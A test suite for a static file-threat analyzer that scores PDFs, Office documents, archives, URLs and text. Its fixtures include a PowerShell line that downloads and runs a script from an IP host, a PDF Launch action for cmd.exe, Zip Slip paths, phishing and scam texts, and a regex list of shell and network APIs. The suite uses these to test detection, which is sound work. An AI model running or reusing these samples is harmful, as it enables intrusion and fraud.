import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { analyzeLure, analyzeUrl, assessThreat, scoreToStatus, THRESHOLDS } from '../electron/threat';
import { analyzeFile } from '../electron/analysis/analyzer';
import { PDF_ACTIVE, PDF_SAFE, makePE, makeZip } from './helpers/fixtures';
import { makeDocx } from './helpers/builders';
import { assessFile, contentStub, ids, real } from './helpers/threat';

let dir: string;
beforeAll(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sp5-')); });
afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));
const A = (name: string, data: Buffer | string, content?: Parameters<typeof assessFile>[3]) => assessFile(dir, name, data, content);
const text = (name: string, body: string) => A(name, body, contentStub(body));
const NOT_ALARMING = ['SAFE', 'LOW_RISK'];

describe('file type / extension rules', () => {
  it('a normal PDF has no mismatch and is not flagged', async () => {
    const r = await A('normal.pdf', PDF_SAFE, contentStub('A short, ordinary document.'));
    expect(ids(r)).not.toContain('FILE_EXEC_DISGUISED'); expect(NOT_ALARMING).toContain(r.status); expect(real(r)).toHaveLength(0);
  });
  it('fake.pdf.exe (real PE) -> double extension + executable, HIGH_RISK, evidence generated from the file', async () => {
    const r = await A('fake.pdf.exe', makePE(), contentStub(null));
    expect(ids(r)).toContain('FILE_DOUBLE_EXTENSION'); expect(ids(r)).toContain('EXEC_FILE'); expect(['HIGH_RISK', 'CRITICAL']).toContain(r.status);
    expect(r.recommendations.map((x) => x.action)).toContain('DO_NOT_OPEN');
  });
  it('exe renamed .pdf: explanation is built from the detected evidence', async () => {
    const r = await A('statement.pdf', makePE(), contentStub(null));
    const f = r.indicators.find((i) => i.id === 'FILE_EXEC_DISGUISED')!;
    expect(f.description).toContain('".pdf"'); expect(f.description).toContain('Windows Executable (PE)'); expect(f.category).toBe('FILE_TYPE_MISMATCH');
    expect(r.reasons.map((x) => x.text).join(' ')).toMatch(/does not match the detected executable type/); expect(['HIGH_RISK', 'CRITICAL']).toContain(r.status);
    const g = await A('statement.jpg', makePE(), contentStub(null)); expect(g.indicators.find((i) => i.id === 'FILE_EXEC_DISGUISED')!.description).toContain('".jpg"');
  });
  it('.scr renamed .jpg and .exe renamed .txt are caught', async () => {
    expect(ids(await A('photo.jpg', makePE(), contentStub(null)))).toContain('FILE_EXEC_DISGUISED');
    expect(ids(await A('notes.txt', makePE(), contentStub(null)))).toContain('FILE_EXEC_DISGUISED');
  });
  it('real.exe (plain) is informational/low, never CRITICAL, and the signature block is not treated as trust', async () => {
    const r = await A('setup.exe', makePE(), contentStub(null));
    expect(r.status).not.toBe('CRITICAL'); expect(ids(r)).toContain('EXEC_FILE'); expect(ids(r)).not.toContain('FILE_EXEC_DISGUISED');
    expect(r.limitations.join(' ')).toMatch(/not cryptographically verified/); expect(r.coverage.content).toBe('UNSUPPORTED');
  });
  it('script.js is flagged as a script, not as malware by itself', async () => {
    const js = 'var x = 1;\nfunction hello() { return "hi"; }\nhello();\n';
    const r = await text('script.js', js);
    expect(ids(r)).toContain('SCRIPT_FILE'); expect(['LOW_RISK', 'SUSPICIOUS']).toContain(r.status); expect(r.score).toBeLessThan(40);
  });
  it('scripts renamed to document / text extensions are detected from content', async () => {
    const js = 'var sh = new ActiveXObject("WScript.Shell");\nfunction run(){ eval(x); }\nvar a = 1;\n';
    expect(ids(await text('notes.txt', js))).toContain('FILE_SCRIPT_IN_TEXT');
    const bat = '@echo off\nset /p x=\ncmd /c start /min calc\n:loop\ngoto loop\n';
    expect(ids(await text('report.pdf', bat))).toContain('FILE_SCRIPT_DISGUISED');
    const ps = 'param($u)\nWrite-Host "hi"\nGet-ChildItem\nStart-Process notepad\n';
    const r = await text('letter.doc', ps); expect(ids(r)).toContain('FILE_SCRIPT_DISGUISED'); expect(r.indicators.find((i) => i.id === 'FILE_SCRIPT_DISGUISED')!.description).toMatch(/PowerShell/);
  });
  it('double extension on a non-executable is one weaker piece of evidence', async () => {
    const weak = await A('salary.pdf.exe', 'just some text, not a program', contentStub('just some text, not a program'));
    expect(ids(weak)).toContain('FILE_DOUBLE_EXTENSION'); expect(weak.indicators.find((i) => i.id === 'FILE_DOUBLE_EXTENSION')!.severity).toBe('MEDIUM'); expect(weak.status).not.toBe('CRITICAL');
    const strong = await A('salary.pdf.exe', makePE(), contentStub(null)); expect(strong.indicators.find((i) => i.id === 'FILE_DOUBLE_EXTENSION')!.severity).toBe('HIGH'); expect(strong.score).toBeGreaterThan(weak.score);
  });
});

describe('PDF rules', () => {
  it('PDF with JavaScript + OpenAction + URL', async () => {
    const r = await A('active.pdf', PDF_ACTIVE, contentStub('Hello'));
    expect(ids(r)).toEqual(expect.arrayContaining(['PDF_JAVASCRIPT', 'PDF_OPENACTION', 'PDF_AUTO_SCRIPT'])); expect(r.status).not.toBe('SAFE');
  });
  it('OpenAction alone is a small indicator', async () => {
    const pdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction [3 0 R /Fit] >>\nendobj\n%%EOF\n');
    const r = await A('view.pdf', pdf, contentStub('Hello')); expect(ids(r)).toContain('PDF_OPENACTION'); expect(ids(r)).not.toContain('PDF_JAVASCRIPT'); expect(r.score).toBeLessThan(20);
  });
  it('PDF with an ordinary HTTPS link is not suspicious', async () => {
    const pdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /S /URI /URI (https://www.example.com/docs) >>\nendobj\n%%EOF\n');
    const r = await A('links.pdf', pdf, contentStub('See https://www.example.com/docs')); expect(NOT_ALARMING).toContain(r.status); expect(real(r)).toHaveLength(0);
  });
  it('PDF with an embedded file', async () => {
    const pdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream >>\nendobj\n%%EOF\n');
    expect(ids(await A('attach.pdf', pdf, contentStub('x')))).toContain('PDF_EMBEDDED_FILES');
  });
  it('PDF with Launch action', async () => {
    const pdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /S /Launch /F (cmd.exe) >>\nendobj\n%%EOF\n');
    const r = await A('launch.pdf', pdf, contentStub('x')); expect(ids(r)).toContain('PDF_LAUNCH'); expect(r.indicators.find((i) => i.id === 'PDF_LAUNCH')!.severity).toBe('HIGH');
  });
});

describe('Office rules', () => {
  const doc = (o: Parameters<typeof makeDocx>[0]) => makeDocx(o);
  it('normal DOCX', async () => { const r = await A('letter.docx', doc({ paragraphs: [{ text: 'Hello' }] }), contentStub('Hello')); expect(NOT_ALARMING).toContain(r.status); expect(real(r)).toHaveLength(0); });
  it('DOCX with macros', async () => {
    const r = await A('macro.docx', doc({ paragraphs: [{ text: 'Hello' }], macro: true }), contentStub('Hello')); expect(ids(r)).toContain('OFFICE_MACROS'); expect(r.categories).toContain('MACRO_RISK'); expect(r.status).not.toBe('SAFE');
  });
  it('macros + "enable content" instruction correlate', async () => {
    const t = 'This document is protected. Please enable content to view the document.';
    const r = await A('macro2.docx', doc({ paragraphs: [{ text: t }], macro: true }), contentStub(t)); expect(ids(r)).toContain('CORR_MACRO_ENABLE_LURE');
  });
  it('DOCX with an ordinary hyperlink: informational only', async () => {
    const r = await A('link.docx', doc({ paragraphs: [{ text: 'Policy', link: 'https://example.com/policy' }] }), contentStub('Policy'));
    expect(ids(r)).toContain('OFFICE_EXTERNAL_RELS'); expect(real(r)).toHaveLength(0);
  });
  it('DOCX with a remote template relationship', async () => {
    const HEAD = '<?xml version="1.0"?>';
    const zip = makeZip({
      '[Content_Types].xml': `${HEAD}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>`,
      '_rels/.rels': `${HEAD}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>`,
      'word/document.xml': `${HEAD}<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>`,
      'word/_rels/settings.xml.rels': `${HEAD}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://198.51.100.7/t.dotm" TargetMode="External"/></Relationships>`
    });
    const r = await A('tmpl.docx', zip, contentStub('x')); expect(ids(r)).toContain('OFFICE_REMOTE_TEMPLATE'); expect(ids(r)).toContain('URL_IP_HOST');
  });
});

describe('archive rules', () => {
  it('normal ZIP', async () => { const r = await A('docs.zip', makeZip({ 'a.txt': 'hello', 'b.pdf': PDF_SAFE }), contentStub('')); expect(NOT_ALARMING).toContain(r.status); expect(real(r)).toHaveLength(0); });
  it('invoice.zip with invoice.pdf + invoice.pdf.exe is stronger than a plain archive', async () => {
    const r = await A('invoice.zip', makeZip({ 'invoice.pdf': PDF_SAFE, 'invoice.pdf.exe': 'MZ fixture' }), contentStub(null));
    expect(ids(r)).toEqual(expect.arrayContaining(['ARCHIVE_EXECUTABLES', 'ARCHIVE_DOUBLE_EXT', 'ARCHIVE_DOC_PLUS_EXEC'])); expect(['HIGH_RISK', 'CRITICAL', 'SUSPICIOUS']).toContain(r.status);
    const plain = await A('plain.zip', makeZip({ 'a.txt': 'x' }), contentStub(null)); expect(r.score).toBeGreaterThan(plain.score + 30);
  });
  it('ZIP with a lone EXE is moderate, not CRITICAL (software is shipped in zips)', async () => {
    const r = await A('tool.zip', makeZip({ 'tool.exe': 'MZ fixture', 'readme.txt': 'hi' }), contentStub(null)); expect(ids(r)).toContain('ARCHIVE_EXECUTABLES'); expect(r.status).not.toBe('CRITICAL'); expect(r.status).not.toBe('HIGH_RISK');
  });
  it('ZIP with a script', async () => { const r = await A('s.zip', makeZip({ 'run.ps1': 'Write-Host hi' }), contentStub(null)); expect(ids(r)).toContain('ARCHIVE_SCRIPTS'); });
  it('ZIP with dangerous (Zip Slip) path', async () => { const r = await A('slip.zip', makeZip({ '../../Startup/evil.txt': 'x' }), contentStub(null)); expect(ids(r)).toContain('ARCHIVE_PATH_TRAVERSAL'); expect(r.indicators.find((i) => i.id === 'ARCHIVE_PATH_TRAVERSAL')!.severity).toBe('HIGH'); });
});

describe('content rules', () => {
  it('normal business text', async () => { const r = await text('mins.txt', 'Meeting minutes for the quarterly review. Action items: update the roadmap and share the slides.'); expect(r.status).toBe('SAFE'); expect(real(r)).toHaveLength(0); });
  it('phishing-style text + suspicious login URL (correlated)', async () => {
    const r = await text('notice.txt', 'Your account will be suspended. Click here to verify your password immediately: http://suspicious-domain.example/login');
    expect(ids(r)).toEqual(expect.arrayContaining(['CONTENT_URGENT_CREDENTIALS', 'CORR_CREDENTIAL_LURE_URL', 'URL_HTTP'])); expect(['HIGH_RISK', 'CRITICAL']).toContain(r.status);
    expect(r.categories).toContain('PHISHING'); expect(r.reasons.map((x) => x.text).join(' ')).toMatch(/requests credentials and the file contains a suspicious link/);
  });
  it('prize scam text', async () => {
    const r = await text('win.txt', 'Congratulations, you won ₹50,000. Pay ₹999 processing fee to claim your prize.');
    expect(ids(r)).toContain('CONTENT_PRIZE_FEE'); expect(r.categories[0]).toBe('FINANCIAL_FRAUD'); expect(r.status).not.toBe('SAFE'); expect(r.status).not.toBe('LOW_RISK');
  });
  it('credential request', async () => {
    const r = await text('c.txt', 'Please enter your password and your card number to continue. Provide your OTP.'); expect(ids(r)).toContain('CONTENT_CREDENTIAL_REQUEST'); expect(r.status).not.toBe('SAFE');
  });
  it('financial scam: scholarship / job fee, refund + bank details, invoice urgency', async () => {
    expect(ids(await text('s.txt', 'Scholarship awarded! Pay a registration fee of Rs 2,000 to confirm your seat.'))).toContain('CONTENT_ADVANCE_FEE');
    expect(ids(await text('j.txt', 'Job offer letter. A refundable security deposit must be paid before joining.'))).toContain('CONTENT_ADVANCE_FEE');
    expect(ids(await text('r.txt', 'You are eligible for a refund. Provide your bank account details to receive it.'))).toContain('CONTENT_REFUND_BANK');
    expect(ids(await text('i.txt', 'Invoice 4471 is overdue. Payment required immediately by wire transfer.'))).toContain('CONTENT_INVOICE_URGENT');
  });
  it('a lone keyword never triggers high risk', async () => {
    for (const body of ['The password policy requires 12 characters.', 'This is urgent: the printer is out of paper.', 'Winner of the quiz: Team B.', 'Our bank account number is on the invoice.', 'HR department holiday list.']) {
      const r = await text('k.txt', body); expect(NOT_ALARMING).toContain(r.status);
    }
  });
  it('negation is respected', async () => { const r = await text('n.txt', 'We never ask you to pay a processing fee. No lottery, no winner announcements.'); expect(ids(r)).not.toContain('CONTENT_PRIZE_FEE'); expect(NOT_ALARMING).toContain(r.status); });
  it('phrase library finds groups', () => { const l = analyzeLure('URGENT: act now. Verify your account. Claim your prize.'); expect(l.count('urgency')).toBeGreaterThan(1); expect(l.has('c_verify')).toBe(true); expect(l.has('p_claim')).toBe(true); });
});

describe('URL analysis', () => {
  const kinds = (u: string, o?: { text?: string }) => analyzeUrl({ url: u, source: 't', ...o }).issues.map((i) => i.kind);
  it('normal HTTPS URL has no issues', () => { const r = analyzeUrl({ url: 'https://www.example.com/docs/readme', source: 't' }); expect(r.issues).toHaveLength(0); expect(r.suspicious).toBe(false); });
  it('HTTP', () => { expect(kinds('http://www.example.com/a')).toContain('HTTP'); });
  it('IP address, hex / decimal host', () => { expect(kinds('http://203.0.113.9/a')).toContain('IP_HOST'); expect(kinds('http://0x7f000001/a')).toContain('OBFUSCATED_HOST'); expect(kinds('http://3232235777/a')).toContain('OBFUSCATED_HOST'); });
  it('login / account wording on unknown site, but not on an official domain', () => { expect(kinds('https://secure-update.example.net/login/verify')).toContain('SENSITIVE_KEYWORDS'); expect(kinds('https://login.microsoftonline.com/common/oauth2')).not.toContain('SENSITIVE_KEYWORDS'); });
  it('suspicious combos: userinfo trick, brand look-alike, typosquat, redirect, credentials in query, link text mismatch', () => {
    expect(kinds('https://www.paypal.com@evil.example.net/x')).toContain('USERINFO');
    expect(kinds('https://paypal-secure-login.example.net/')).toContain('BRAND_LOOKALIKE');
    expect(kinds('https://paypa1.example.net/')).toContain('BRAND_TYPOSQUAT');
    expect(kinds('https://a.example.com/r?url=http://evil.example.net')).toContain('REDIRECT_PARAM');
    expect(kinds('https://a.example.com/x?password=hunter2')).toContain('CREDENTIALS_IN_QUERY');
    expect(kinds('https://evil.example.net/x', { text: 'www.paypal.com' })).toContain('LINK_TEXT_MISMATCH');
  });
  it('punycode, shortener, port, subdomains, long URL, risky schemes', () => {
    expect(kinds('http://xn--pypal-4ve.com/')).toContain('PUNYCODE'); expect(kinds('https://bit.ly/abc')).toContain('SHORTENER'); expect(kinds('http://example.com:4444/a')).toContain('PORT');
    expect(kinds('https://a.b.c.d.e.example.com/')).toContain('EXCESSIVE_SUBDOMAINS'); expect(kinds(`https://example.com/${'a'.repeat(600)}`)).toContain('VERY_LONG');
    expect(kinds('javascript:alert(1)')).toContain('SUSPICIOUS_SCHEME'); expect(kinds('\\\\attacker\\share\\x')).toContain('UNC_PATH');
  });
  it('a clean URL list never makes a file suspicious', async () => { const r = await text('l.txt', 'Docs: https://www.example.com/a and https://example.org/b'); expect(r.status).toBe('SAFE'); });
});

describe('script content, correlation and scoring', () => {
  it('encoded PowerShell downloader is HIGH_RISK with explainable evidence', async () => {
    const ps = 'param($u)\n$ErrorActionPreference="Stop"\nIEX (New-Object Net.WebClient).DownloadString("http://203.0.113.4/a.ps1") -ExecutionPolicy Bypass -WindowStyle Hidden';
    const r = await text('update.ps1', ps); expect(ids(r)).toEqual(expect.arrayContaining(['SCRIPT_DOWNLOAD_EXEC', 'SCRIPT_IEX', 'SCRIPT_POLICY'])); expect(['HIGH_RISK', 'CRITICAL']).toContain(r.status); expect(r.executionPerformed).toBe(false);
  });
  it('weak indicators combine: each alone is low, together they are higher', async () => {
    const one = await text('a.txt', 'Please verify your account.'); const many = await text('b.txt', 'URGENT. Your account will be suspended. Please verify your account: http://secure-login.example.net/verify');
    expect(one.score).toBeLessThan(20); expect(many.score).toBeGreaterThan(one.score + 30);
  });
  it('de-duplication: login wording in URL + text + path does not triple count', async () => {
    const r = await text('d.txt', 'Verify your password at http://example.net/login/password/verify'); expect(r.score).toBeLessThan(25); expect(r.breakdown.contributions.some((c) => /same evidence/.test(c.note ?? ''))).toBe(true);
  });
  it('HIGH_RISK needs a HIGH indicator and CRITICAL needs two (guards)', () => {
    const base = assessThreat({ fileName: 'x.txt', analysis: null, content: null }); expect(base.status).toBe('UNKNOWN');
    expect(scoreToStatus(0)).toBe('SAFE'); expect(scoreToStatus(THRESHOLDS.LOW_RISK)).toBe('LOW_RISK'); expect(scoreToStatus(THRESHOLDS.SUSPICIOUS)).toBe('SUSPICIOUS'); expect(scoreToStatus(THRESHOLDS.HIGH_RISK)).toBe('HIGH_RISK'); expect(scoreToStatus(THRESHOLDS.CRITICAL)).toBe('CRITICAL');
  });
  it('is deterministic', async () => {
    const a = await text('same.txt', 'URGENT verify your password http://x.example.net/login'); const b = assessThreat({ fileName: 'same.txt', analysis: await analyzeFile(path.join(dir, 'same.txt')), content: contentStub('URGENT verify your password http://x.example.net/login'), now: a.analyzedAt });
    expect({ ...b, analyzedAt: '' }).toEqual({ ...a, analyzedAt: '' });
  });
  it('multiple serious signals reach CRITICAL', async () => {
    const r = await A('invoice.pdf.exe', makePE(), contentStub(null)); const z = await A('scholarship.zip', makeZip({ 'scholarship.pdf': PDF_SAFE, 'scholarship.pdf.exe': 'MZ x', '../../evil.bat': 'x' }), contentStub(null));
    expect(r.score).toBeGreaterThan(60); expect(z.score).toBeGreaterThan(60);
  });
});

describe('false-positive protection', () => {
  it('normal invoice', async () => { const r = await text('inv.txt', 'Invoice #1042 for consulting services. Total due: $1,250. Payment is due within 30 days to the bank account listed below. Thank you.'); expect(NOT_ALARMING).toContain(r.status); });
  it('normal HR document', async () => { const r = await text('hr.txt', 'HR department: updated leave policy. Employees should confirm their details in the HR portal by the end of the quarter.'); expect(NOT_ALARMING).toContain(r.status); });
  it('normal college document', async () => { const r = await text('c.txt', 'University registrar notice: the examination timetable is available. Students must collect hall tickets within 2 days from the office.'); expect(NOT_ALARMING).toContain(r.status); });
  it('normal PDF with ordinary links', async () => { const pdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /S /URI /URI (https://github.com/org/repo) >>\nendobj\n%%EOF\n'); const r = await A('r.pdf', pdf, contentStub('Source code is on GitHub.')); expect(NOT_ALARMING).toContain(r.status); });
  it('normal executable installer', async () => { const r = await A('installer.exe', makePE(), contentStub(null)); expect(['SAFE', 'LOW_RISK', 'UNKNOWN', 'SUSPICIOUS']).toContain(r.status); expect(r.status).not.toBe('CRITICAL'); expect(r.status).not.toBe('HIGH_RISK'); });
  it('a security-awareness text that quotes phishing phrases with a single keyword is not CRITICAL', async () => { const r = await text('aw.txt', 'Tip: urgent emails asking you to verify your account are often phishing. Do not click.'); expect(r.status).not.toBe('CRITICAL'); expect(r.status).not.toBe('HIGH_RISK'); });
});

describe('partial / failed / unsupported / truncated analysis never yields SAFE', () => {
  const mk = async (status: 'FAILED' | 'PARTIAL' | 'UNSUPPORTED' | 'COMPLETED', extra: object = {}) => {
    const p = path.join(dir, `pa-${status}.pdf`); fs.writeFileSync(p, PDF_SAFE); const analysis = await analyzeFile(p);
    return assessThreat({ fileName: 'pa.pdf', analysis, content: contentStub('Plain text', { status, ...extra }) });
  };
  for (const s of ['FAILED', 'PARTIAL', 'UNSUPPORTED'] as const) it(`content ${s}`, async () => { const r = await mk(s); expect(r.status).toBe('UNKNOWN'); expect(r.analysisComplete).toBe(false); expect(r.coverage.threat).toBe('INCOMPLETE'); expect(r.confidence).toBeLessThan(85); expect(r.headline).toMatch(/incomplete/i); });
  it('content TRUNCATED', async () => { const r = await mk('COMPLETED', { truncated: true, truncationNote: 'Only the first 100 KB was read.' }); expect(r.status).toBe('UNKNOWN'); expect(r.coverage.content).toBe('TRUNCATED'); });
  it('content not finished yet', () => { const r = assessThreat({ fileName: 'a.pdf', analysis: null, content: null, contentStatus: 'QUEUED' }); expect(r.status).toBe('UNKNOWN'); });
  it('static analysis failed -> UNKNOWN with low confidence', async () => { const r = await analyzeFile(path.join(dir, 'does-not-exist.pdf')); const a = assessThreat({ fileName: 'x.pdf', analysis: r, content: null }); expect(r.status).toBe('failed'); expect(a.status).toBe('UNKNOWN'); expect(a.confidence).toBeLessThan(20); });
  it('incomplete analysis WITH findings still reports them (not hidden by UNKNOWN)', async () => {
    const p = path.join(dir, 'inc-invoice.pdf.exe'); fs.writeFileSync(p, makePE()); const analysis = await analyzeFile(p); const r = assessThreat({ fileName: 'inc-invoice.pdf.exe', analysis, content: contentStub(null, { status: 'FAILED' }) });
    expect(ids(r)).toContain('FILE_DOUBLE_EXTENSION'); expect(r.status).not.toBe('UNKNOWN'); expect(r.analysisComplete).toBe(false);
  });
  it('an unsupported executable is not "incomplete" (content extraction is intentionally skipped)', async () => { const r = await A('tool.exe', makePE(), contentStub(null)); expect(r.analysisComplete).toBe(true); expect(r.coverage.content).toBe('UNSUPPORTED'); });
  it('SAFE wording never claims a guarantee', async () => {
    const r = await text('ok.txt', 'Hello world'); const all = JSON.stringify([r.headline, r.recommendations, r.disclaimer, r.limitations]);
    expect(r.status).toBe('SAFE'); expect(all).not.toMatch(/100% safe|guaranteed safe|virus[- ]free|no malware/i); expect(r.headline).toMatch(/No suspicious indicators detected/);
    expect(r.disclaimer).toMatch(/does not guarantee malware detection/); expect(r.scoreKind).toBe('heuristic');
  });
  it('confidence and risk are independent', async () => { const a = await text('x1.txt', 'Hello'); const b = await mk('FAILED'); expect(a.score).toBe(0); expect(b.score).toBe(0); expect(a.confidence).toBeGreaterThan(b.confidence + 20); });
});

describe('security of the engine itself', () => {
  it('threat module uses no network, process or shell APIs and never executes content', () => {
    const root = path.join(__dirname, '..', 'electron', 'threat');
    const files: string[] = []; const walk = (d: string) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) e.isDirectory() ? walk(path.join(d, e.name)) : e.name.endsWith('.ts') && files.push(path.join(d, e.name)); }; walk(root);
    expect(files.length).toBeGreaterThan(10);
    for (const f of files) { const src = fs.readFileSync(f, 'utf8'); expect(src, f).not.toMatch(/child_process|shell\.open|openExternal|from 'node:https?'|from 'node:net'|from 'node:dns'|require\(['"]https?['"]\)|\bfetch\(|\beval\(|new Function\(|XMLHttpRequest|(?<![.\w])exec(?:Sync|File)?\(|\bspawn\(/); }
  });
  it('hostile text cannot break the engine and is sanitized in evidence', async () => {
    const r = await text('h.txt', `verify your password \u202E immediately ${'A'.repeat(300000)} <script>alert(1)</script> http://${'a'.repeat(5000)}.example.net/`);
    expect(r.indicators.every((i) => !/[\u202e\u0000]/.test(i.evidence ?? ''))).toBe(true); expect(JSON.stringify(r).length).toBeLessThan(500_000);
  });
});
